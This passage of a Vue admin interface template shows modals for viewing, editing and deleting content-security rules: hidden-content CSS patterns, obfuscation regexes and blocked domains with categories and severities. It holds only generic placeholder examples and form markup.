          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">CSS Declaration / Pattern</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              {{ selectedHiddenContentRule.pattern }}
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedHiddenContentRule.severity))">
              {{ selectedHiddenContentRule.severity }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedHiddenContentRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedHiddenContentRule.is_enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedHiddenContentRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedHiddenContentRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedHiddenContentRule.is_active 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedHiddenContentRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedHiddenContentRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedHiddenContentRule.description?.trim()">{{ selectedHiddenContentRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedHiddenContentRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedHiddenContentRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedHiddenContentRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedHiddenContentRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeHiddenContentViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: VIEW OBFUSCATION RULE DETAILS -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="obfuscationModalState.isView.value"
      :title="isObfuscationDetailsLoading ? 'Loading Obfuscation Rule...' : (selectedObfuscationRule ? `Obfuscation Rule #${selectedObfuscationRule.id}` : 'Obfuscation Rule Details')"
      subtitle="Comprehensive security inspection parameters and audit metadata."
      max-width="max-w-2xl"
      @close="closeObfuscationViewModal"
    >
      <!-- Loading State -->
      <div v-if="isObfuscationDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving obfuscation rule details from security registry...</p>
      </div>

      <!-- Error / Not Found State -->
      <div v-else-if="!selectedObfuscationRule" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <div class="w-12 h-12 rounded-2xl bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertCircle class="w-6 h-6" />
        </div>
        <p class="text-sm font-bold text-foreground">Rule Details Not Available</p>
        <p class="text-xs text-muted-foreground">Could not load the requested obfuscation rule from the security engine.</p>
        <button 
          type="button"
          @click="closeObfuscationViewModal"
          class="mt-2 h-9 px-4 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
        >
          Close
        </button>
      </div>

      <!-- Loaded Details View -->
      <div v-else class="p-6 sm:p-8 space-y-6">
        <!-- Hero Summary Card -->
        <div class="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 p-5 bg-muted/40 rounded-2xl border border-border">
          <div class="space-y-1.5 min-w-0">
            <div class="flex items-center gap-2 flex-wrap">
              <span class="text-[10px] uppercase font-bold tracking-widest text-muted-foreground">Pattern / Regex</span>
            </div>
            <div class="font-mono text-base sm:text-lg font-bold text-foreground bg-background px-3 py-1.5 rounded-xl border border-border shadow-2xs inline-block break-all">
              {{ selectedObfuscationRule.pattern }}
            </div>
          </div>

          <div class="flex items-center gap-2 shrink-0 flex-wrap">
            <!-- Severity Badge -->
            <span :class="cn('px-3 py-1 rounded-full text-xs font-extrabold uppercase tracking-wider border', getSeverityBadge(selectedObfuscationRule.severity))">
              {{ selectedObfuscationRule.severity }}
            </span>
          </div>
        </div>

        <!-- Rule Specifications Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-1">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Category</span>
            <p class="text-sm font-bold text-foreground">{{ selectedObfuscationRule.category }}</p>
          </div>

          <!-- Status Indicators -->
          <div class="p-4 bg-card border border-border rounded-xl space-y-2">
            <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Operational Status</span>
            <div class="flex items-center gap-3">
              <!-- Enabled Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedObfuscationRule.is_enabled 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedObfuscationRule.is_enabled ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedObfuscationRule.is_enabled ? 'Enabled' : 'Disabled' }}</span>
              </span>

              <!-- Active Status -->
              <span 
                :class="cn(
                  'px-2.5 py-0.5 rounded-full text-[10px] font-extrabold uppercase tracking-wider border flex items-center gap-1.5',
                  selectedObfuscationRule.is_active 
                    ? 'bg-emerald-500/10 text-emerald-600 border-emerald-500/30' 
                    : 'bg-muted text-muted-foreground border-border'
                )"
              >
                <span :class="cn('w-1.5 h-1.5 rounded-full', selectedObfuscationRule.is_active ? 'bg-emerald-500' : 'bg-muted-foreground')"></span>
                <span>{{ selectedObfuscationRule.is_active ? 'Active' : 'Inactive' }}</span>
              </span>
            </div>
          </div>
        </div>

        <!-- Description Section -->
        <div class="space-y-1.5">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Rule Description & Rationale</span>
          <div class="bg-card border border-border rounded-xl p-4 text-xs font-medium text-foreground leading-relaxed">
            <p v-if="selectedObfuscationRule.description?.trim()">{{ selectedObfuscationRule.description }}</p>
            <p v-else class="text-muted-foreground italic">No description provided for this rule.</p>
          </div>
        </div>

        <!-- Audit & Tracking Metadata -->
        <div class="space-y-2 pt-2 border-t border-border">
          <span class="text-[10px] font-bold uppercase tracking-wider text-muted-foreground">Audit & Lifecycle Metadata</span>
          <div class="bg-muted/30 border border-border rounded-xl p-4 grid grid-cols-1 sm:grid-cols-2 gap-4 text-xs">
            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Created At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedObfuscationRule.created_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <Calendar class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated At:</span>
              </div>
              <p class="font-mono text-foreground font-medium pl-5">{{ formatDate(selectedObfuscationRule.updated_at) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Created By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedObfuscationRule.created_by) }}</p>
            </div>

            <div class="space-y-1">
              <div class="flex items-center gap-1.5 text-muted-foreground">
                <User class="w-3.5 h-3.5" />
                <span class="font-semibold">Updated By:</span>
              </div>
              <p class="text-foreground font-medium pl-5">{{ formatUserInfo(selectedObfuscationRule.updated_by) }}</p>
            </div>
          </div>
        </div>

        <!-- Modal Footer -->
        <div class="pt-4 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            @click="closeObfuscationViewModal"
            class="h-9 px-5 bg-muted hover:bg-muted/80 text-foreground rounded-xl text-xs font-bold transition-colors cursor-pointer"
          >
            Close
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT OBFUSCATION RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="obfuscationModalState.isEdit.value"
      :title="isObfuscationDetailsLoading ? 'Loading Obfuscation Rule...' : (editingObfuscationRuleId ? `Edit Obfuscation Rule #${editingObfuscationRuleId}` : 'Edit Obfuscation Rule')"
      subtitle="Update pattern heuristics and classification parameters for this obfuscation rule."
      max-width="max-w-lg"
      @close="closeObfuscationEditModal"
    >
      <!-- Loading State -->
      <div v-if="isObfuscationDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving obfuscation rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateObfuscationRule" class="p-6 space-y-4">
        <!-- Pattern / Regex -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Pattern / Regular Expression <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="obfuscationEditForm.pattern"
            type="text" 
            placeholder="e.g. [a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}, (?i)v[il1][a-z0-9]{3,}"
            class="w-full h-9 px-3 bg-background border border-input rounded-xl text-xs font-mono text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all placeholder:text-muted-foreground/60"
            required
          />
          <p class="text-[11px] text-muted-foreground">
            Specify the regex pattern or heuristic sequence to detect evasion tactics and obfuscated content.
          </p>
        </div>

        <!-- Category & Severity Grid -->
        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <!-- Category -->
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">
              Category <span class="text-rose-500">*</span>
            </label>
            <select 
              v-model="obfuscationEditForm.category"
              class="w-full h-9 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all cursor-pointer"
            >
              <option value="SPAM">Spam Blacklist</option>
              <option value="PHISHING">Phishing & Social Engineering</option>
              <option value="MALWARE">Malicious URLs & Payloads</option>
              <option value="POLICY">Policy & Regulatory Violation</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="OBFUSCATION">Obfuscation Rules</option>
              <option value="OTHER">Other Custom Heuristics</option>
            </select>
          </div>

          <!-- Severity -->
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">
              Severity Level <span class="text-rose-500">*</span>
            </label>
            <select 
              v-model="obfuscationEditForm.severity"
              class="w-full h-9 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all cursor-pointer"
            >
              <option value="LOW">Low Risk</option>
              <option value="MEDIUM">Medium Risk</option>
              <option value="HIGH">High Risk</option>
              <option value="CRITICAL">Critical Severity</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Rule Description & Rationale
          </label>
          <textarea 
            v-model="obfuscationEditForm.description"
            rows="3"
            placeholder="Document why this regex/heuristic rule was established, evasion patterns targeted, and false positive safeguards..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground focus:ring-2 focus:ring-primary/20 focus:border-primary outline-none transition-all resize-none placeholder:text-muted-foreground/60 leading-relaxed"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="pt-2 border-t border-border flex items-center justify-between">
          <div class="space-y-0.5">
            <label class="text-xs font-bold text-foreground cursor-pointer" for="edit-obfuscation-enabled">
              Enable Inspection Heuristic
            </label>
            <p class="text-[11px] text-muted-foreground">
              When enabled, incoming content will actively be evaluated against this obfuscation pattern.
            </p>
          </div>
          <input 
            id="edit-obfuscation-enabled"
            v-model="obfuscationEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingObfuscationEdit"
            @click="closeObfuscationEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingObfuscationEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingObfuscationEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingObfuscationEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE OBFUSCATION RULE CONFIRMATION -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="obfuscationModalState.isDelete.value"
      title="Delete Obfuscation Rule"
      subtitle="Verify decommissioning of this content security obfuscation rule."
      max-width="max-w-md"
      :show-close-button="!isDeletingObfuscationRule"
      @close="closeObfuscationDeleteModal"
    >
      <div class="p-6 space-y-5">
        <div class="w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-600 flex items-center justify-center">
          <Trash2 class="w-6 h-6" />
        </div>

        <div class="space-y-2">
          <p class="text-sm font-bold text-foreground">
            Are you sure you want to delete this obfuscation rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Pattern <span class="font-mono font-bold text-foreground">{{ deletingObfuscationRule?.pattern || (selectedObfuscationRule ? selectedObfuscationRule.pattern : `ID #${obfuscationModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isDeletingObfuscationRule"
            @click="closeObfuscationDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingObfuscationRule"
            @click="executeDeleteObfuscationRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingObfuscationRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingObfuscationRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT HIDDEN CONTENT RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="hiddenContentModalState.isEdit.value"
      :title="isHiddenContentDetailsLoading ? 'Loading Hidden Content Rule...' : (editingHiddenContentRuleId ? `Edit Hidden Content Rule #${editingHiddenContentRuleId}` : 'Edit Hidden Content Rule')"
      subtitle="Update CSS pattern heuristics and classification parameters for this hidden content rule."
      max-width="max-w-lg"
      @close="closeHiddenContentEditModal"
    >
      <!-- Loading State -->
      <div v-if="isHiddenContentDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving hidden content rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateHiddenContentRule" class="p-6 space-y-4">
        <!-- CSS Declaration / Pattern -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            CSS Declaration / Pattern <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="hiddenContentEditForm.pattern"
            type="text" 
            placeholder="e.g. display:none, opacity:0, font-size:0, visibility:hidden"
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Severity Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="hiddenContentEditForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="INJECTION">Injection</option>
              <option value="REDIRECT">Redirect</option>
              <option value="OTHER">Other</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
            <select 
              v-model="hiddenContentEditForm.severity"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="CRITICAL">Critical</option>
              <option value="HIGH">High</option>
              <option value="MEDIUM">Medium</option>
              <option value="LOW">Low</option>
              <option value="INFO">Info</option>
            </select>
          </div>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="hiddenContentEditForm.description"
            rows="2"
            placeholder="Explain why this hidden content pattern is flagged or prohibited..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="hiddenContentEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingHiddenContentEdit"
            @click="closeHiddenContentEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingHiddenContentEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingHiddenContentEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingHiddenContentEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE HIDDEN CONTENT RULE CONFIRMATION -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="hiddenContentModalState.isDelete.value"
      title="Delete Hidden Content Rule"
      subtitle="Verify decommissioning of this content security hidden content rule."
      max-width="max-w-md"
      :show-close-button="!isDeletingHiddenContentRule"
      @close="closeHiddenContentDeleteModal"
    >
      <div class="p-6 space-y-5">
        <div class="w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-600 flex items-center justify-center">
          <Trash2 class="w-6 h-6" />
        </div>

        <div class="space-y-2">
          <p class="text-sm font-bold text-foreground">
            Are you sure you want to delete this hidden content rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Pattern <span class="font-mono font-bold text-foreground">{{ deletingHiddenContentRule?.pattern || (selectedHiddenContentRule ? selectedHiddenContentRule.pattern : `ID #${hiddenContentModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isDeletingHiddenContentRule"
            @click="closeHiddenContentDeleteModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="button" 
            :disabled="isDeletingHiddenContentRule"
            @click="executeDeleteHiddenContentRule"
            class="h-9 px-5 bg-rose-600 hover:bg-rose-700 text-white rounded-xl text-xs font-bold transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isDeletingHiddenContentRule" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isDeletingHiddenContentRule ? 'Deleting...' : 'Delete Rule' }}</span>
          </button>
        </div>
      </div>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: EDIT DOMAIN RULE -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="domainModalState.isEdit.value"
      :title="isDomainDetailsLoading ? 'Loading Domain Rule...' : (editingDomainRuleId ? `Edit Domain Rule #${editingDomainRuleId}` : 'Edit Domain Rule')"
      subtitle="Update pattern heuristics and classification parameters for this domain rule."
      max-width="max-w-lg"
      @close="closeDomainEditModal"
    >
      <!-- Loading State -->
      <div v-if="isDomainDetailsLoading" class="p-12 flex flex-col items-center justify-center gap-3 text-center">
        <Loader2 class="w-8 h-8 animate-spin text-primary" />
        <p class="text-xs font-semibold text-muted-foreground">Retrieving domain rule details for editing...</p>
      </div>

      <!-- Form -->
      <form v-else @submit.prevent="submitUpdateDomainRule" class="p-6 space-y-4">
        <!-- Domain -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">
            Domain <span class="text-rose-500">*</span>
          </label>
          <input 
            v-model="domainEditForm.domain"
            type="text" 
            placeholder="e.g. malicious-site.com, cdn-phish.net, etc."
            required
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-mono font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20 transition-all"
          />
        </div>

        <!-- Category & Match Type Row -->
        <div class="grid grid-cols-2 gap-3">
          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Category <span class="text-rose-500">*</span></label>
            <select 
              v-model="domainEditForm.category"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="SPAM">Spam</option>
              <option value="SCAM">Scam</option>
              <option value="PHISHING">Phishing</option>
              <option value="MALWARE">Malware</option>
              <option value="ADULT">Adult</option>
              <option value="DRUG">Drug</option>
              <option value="GAMBLING">Gambling</option>
              <option value="HIDDEN_CONTENT">Hidden Content</option>
              <option value="INJECTION">Injection</option>
              <option value="OBFUSCATION">Obfuscation</option>
              <option value="REDIRECT">Redirect</option>
            </select>
          </div>

          <div class="space-y-1.5">
            <label class="text-xs font-bold text-foreground">Match Type <span class="text-rose-500">*</span></label>
            <select 
              v-model="domainEditForm.match_type"
              class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
            >
              <option value="EXACT">Exact Domain</option>
              <option value="SUBDOMAIN">Domain And Subdomains</option>
            </select>
          </div>
        </div>

        <!-- Severity -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Severity <span class="text-rose-500">*</span></label>
          <select 
            v-model="domainEditForm.severity"
            class="w-full h-10 px-3 bg-background border border-input rounded-xl text-xs font-semibold text-foreground outline-none focus:ring-2 focus:ring-ring/20 cursor-pointer"
          >
            <option value="CRITICAL">Critical</option>
            <option value="HIGH">High</option>
            <option value="MEDIUM">Medium</option>
            <option value="LOW">Low</option>
            <option value="INFO">Info</option>
          </select>
        </div>

        <!-- Description -->
        <div class="space-y-1.5">
          <label class="text-xs font-bold text-foreground">Description</label>
          <textarea 
            v-model="domainEditForm.description"
            rows="2"
            placeholder="Explain why this domain is blocked..."
            class="w-full p-3 bg-background border border-input rounded-xl text-xs font-medium text-foreground outline-none focus:ring-2 focus:ring-ring/20"
          ></textarea>
        </div>

        <!-- Enabled Toggle -->
        <div class="flex items-center justify-between p-3 bg-muted/40 rounded-xl border border-border">
          <div>
            <p class="text-xs font-bold text-foreground">Rule Enabled</p>
            <p class="text-[10px] text-muted-foreground">Active rules are evaluated during content security scans</p>
          </div>
          <input 
            v-model="domainEditForm.is_enabled"
            type="checkbox" 
            class="w-4 h-4 rounded border-border text-primary focus:ring-primary/20 accent-primary cursor-pointer"
          />
        </div>

        <!-- Form Actions -->
        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
            type="button" 
            :disabled="isSubmittingDomainEdit"
            @click="closeDomainEditModal"
            class="h-9 px-4 rounded-xl text-xs font-bold text-muted-foreground hover:bg-muted transition-colors disabled:opacity-50 cursor-pointer"
          >
            Cancel
          </button>
          <button 
            type="submit" 
            :disabled="isSubmittingDomainEdit"
            class="h-9 px-5 bg-primary text-primary-foreground rounded-xl text-xs font-bold hover:bg-primary/90 transition-colors shadow-xs flex items-center gap-1.5 disabled:opacity-70 cursor-pointer"
          >
            <Loader2 v-if="isSubmittingDomainEdit" class="w-3.5 h-3.5 animate-spin" />
            <span>{{ isSubmittingDomainEdit ? 'Saving Changes...' : 'Save Changes' }}</span>
          </button>
        </div>
      </form>
    </UiAdminModal>

    <!-- ========================================== -->
    <!-- MODAL: DELETE DOMAIN RULE CONFIRMATION -->
    <!-- ========================================== -->
    <UiAdminModal
      :is-open="domainModalState.isDelete.value"
      title="Delete Domain Rule"
      subtitle="Verify decommissioning of this content security domain rule."
      max-width="max-w-md"
      :show-close-button="!isDeletingDomainRule"
      @close="closeDomainDeleteModal"
    >
      <div class="p-6 space-y-5">
        <div class="w-12 h-12 rounded-2xl bg-rose-500/10 text-rose-600 flex items-center justify-center">
          <Trash2 class="w-6 h-6" />
        </div>

        <div class="space-y-2">
          <p class="text-sm font-bold text-foreground">
            Are you sure you want to delete this domain rule?
          </p>
          <p class="text-xs text-muted-foreground leading-relaxed">
            Domain <span class="font-mono font-bold text-foreground">{{ deletingDomainRule?.domain || (selectedDomainRule ? selectedDomainRule.domain : `ID #${domainModalState.activeId.value}`) }}</span> will be permanently removed from active content inspection heuristics.
          </p>
        </div>

        <div class="pt-3 border-t border-border flex items-center justify-end gap-2">
          <button 
